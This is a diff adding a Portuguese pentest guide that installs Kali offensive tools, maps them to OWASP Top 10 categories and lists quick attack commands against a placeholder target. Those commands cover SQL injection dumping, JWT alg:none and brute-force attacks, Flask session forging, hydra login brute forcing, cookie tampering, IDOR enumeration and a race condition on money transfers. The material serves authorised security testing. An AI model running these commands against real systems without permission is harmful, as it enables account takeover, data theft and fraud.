@@ -1,0 +1,169 @@
+================================================================
+  MANUCASPT — KALI TOOLS INSTALL GUIDE
+  Todas as tools profissionais para pentest avancado
+================================================================
+
+INSTALA TUDO DE UMA VEZ (copia e cola no Kali):
+
+----------------------------------------------------------------
+
+# 1. RECONHECIMENTO & DESCOBERTA
+sudo apt install -y \
+  subfinder \
+  httpx-toolkit \
+  nmap \
+  amass \
+  assetfinder \
+  aquatone \
+  whatweb \
+  gobuster \
+  ffuf \
+  feroxbuster \
+  katana
+
+# 2. SCANNING DE VULNERABILIDADES
+sudo apt install -y nuclei
+nuclei -update-templates        # IMPORTANTE: atualiza todos os templates
+
+# 3. INJECAO (SQL, NoSQL, Command)
+sudo apt install -y sqlmap
+pip3 install ghauri              # SQLi avancado
+sudo apt install -y commix       # Command injection
+
+# 4. BRUTE FORCE & AUTENTICACAO
+sudo apt install -y hydra medusa
+pip3 install flask-unsign        # Flask session forging
+pip3 install jwt_tool            # JWT attacks (alg:none, brute, etc)
+sudo apt install -y hashcat john # Password cracking
+
+# 5. SSL/TLS & CRIPTOGRAFIA
+sudo apt install -y testssl.sh sslscan sslyze
+
+# 6. WORDPRESS & CMS
+sudo apt install -y wpscan
+sudo apt install -y joomscan
+pip3 install droopescan
+
+# 7. XSS & WEB ATTACKS
+pip3 install dalfox              # XSS scanner avancado
+sudo apt install -y xsser
+sudo apt install -y beef-xss     # XSS framework com callback
+
+# 8. EXPLORACAO & POST-EXPLOITATION
+sudo apt install -y metasploit-framework
+sudo apt install -y exploitdb    # searchsploit
+sudo apt install -y sqlninja
+
+# 9. RECON AVANCADO
+sudo apt install -y gau          # URL discovery (Wayback + AlienVault)
+sudo apt install -y hakrawler
+sudo apt install -y arjun        # Parameter discovery
+pip3 install waymore             # URL mining
+
+# 10. ANALISE DE DEPENDENCIAS (Supply Chain)
+npm install -g retire            # JS library vulnerability scanner
+sudo apt install -y nikto        # Web server scanner
+
+# 11. REDE & SERVICOS
+sudo apt install -y masscan      # Port scanner (mais rapido que nmap)
+sudo apt install -y smbclient    # SMB enumeration
+sudo apt install -y enum4linux-ng
+
+# 12. WORDLISTS (ESSENCIAL)
+sudo apt install -y seclists
+sudo apt install -y wordlists
+gunzip /usr/share/wordlists/rockyou.txt.gz   # Password list
+
+----------------------------------------------------------------
+
+VERIFICAR INSTALACAO (copia no terminal Kali):
+
+for tool in subfinder httpx nmap nuclei sqlmap ghauri hydra wpscan \
+  testssl.sh ffuf gobuster whatweb dalfox commix hashcat \
+  feroxbuster msfconsole searchsploit; do
+  which $tool &>/dev/null && echo "[OK] $tool" || echo "[MISS] $tool"
+done
+
+----------------------------------------------------------------
+
+CONFIGURAR NUCLEI CORRETAMENTE:
+nuclei -update
+nuclei -update-templates
+nuclei -list-templates | wc -l   # deve mostrar +10.000 templates
+
+----------------------------------------------------------------
+
+================================================================
+  MAPEAMENTO TOOL → OWASP TOP 10 2025
+================================================================
+
+A01 Broken Access Control:
+  ffuf (admin paths) | nuclei (access-control) | arjun (params)
+  Manual: curl com Cookie: role=admin | IDOR em IDs sequenciais
+
+A02 Security Misconfiguration:
+  nuclei (misconfig, exposure) | nikto | gobuster | whatweb
+
+A03 Supply Chain:
+  retire (JS libs) | nuclei (technologies) | dalfox
+
+A04 Cryptographic Failures:
+  testssl.sh | sslscan | sslyze | nuclei (ssl)
+
+A05 Injection:
+  sqlmap | ghauri (SQL) | commix (Command) | dalfox (XSS)
+  nuclei (ssti, lfi, injection)
+
+A06 Business Logic:
+  arjun (descobrir params) | Manual via Claude
+  race_cond (simultaneidade) | Burp Suite Repeater
+
+A07 Authentication Failures:
+  hydra | medusa | jwt_tool | flask-unsign | hashcat
+
+A08 Integrity Failures:
+  retire | nuclei (integrity, exposures)
+
+A09 Logging Failures:
+  Nao testavel externamente — precisa acesso interno
+
+A10 Exceptional Conditions:
+  ffuf (fuzzing com null bytes, unicode) | nuclei (exposure)
+
+================================================================
+  COMANDOS RAPIDOS — PENTEST MANUAL
+================================================================
+
+# Descobrir subdomains
+subfinder -d target.com -silent | httpx -title -tech-detect -status-code
+
+# Scan completo Nuclei
+nuclei -u https://target.com -t cves,misconfig,exposures,vulnerabilities,default-logins,takeovers,ssti,lfi,xss,ssrf -severity critical,high,medium
+
+# SQLi rapido
+sqlmap -u "https://target.com/page?id=1" --batch --dbs --level=3 --risk=3
+
+# JWT attack
+jwt_tool TOKEN -X a                            # alg:none
+jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # brute force
+
+# Flask session
+flask-unsign --decode --cookie "SESSION_COOKIE"
+flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'secret'
+
+# Brute force login
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+# Cookie tamper
+curl -si https://target.com -H "Cookie: role=admin; isAdmin=true; user_id=1"
+
+# IDOR test
+for i in $(seq 1 20); do curl -si "https://target.com/api/user/$i" | grep -i 'email\|name\|200'; done
+
+# Race condition (balance manipulation)
+for i in $(seq 1 20); do curl -X POST "https://target.com/transfer" -d "amount=100" & done; wait
+
+# WPScan
+wpscan --url https://target.com --enumerate vp,u,ap --api-token TUA_KEY
+
+================================================================
